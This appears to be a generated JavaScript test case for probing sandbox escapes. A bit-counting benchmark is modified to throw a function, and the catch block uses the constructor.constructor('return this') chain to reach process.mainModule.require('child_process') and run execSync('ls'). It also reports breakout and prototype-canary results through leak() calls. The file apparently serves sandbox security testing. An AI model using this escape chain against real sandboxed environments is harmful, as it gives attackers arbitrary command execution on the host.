try {
    var result = 0;
    function bitsinbyte(b) {
        let REPLACER = 23;
        var m = 1, c = 0;
        while (m < 256) {
            if (b & m)
                c++;
            m <<= 1;
        }
        return c;
    }
    function TimeFunc(func) {
        throw () => {
            return () => {
            };
        };
        var x, y, t;
        var sum = 0;
        for (var x = 0; x < 350; x++)
            for (var y = 0; y < 256; y++)
                sum += func(y);
        return sum;
    }
    result = TimeFunc(bitsinbyte);
    var expected = 358400;
    if (result != expected)
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + result;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}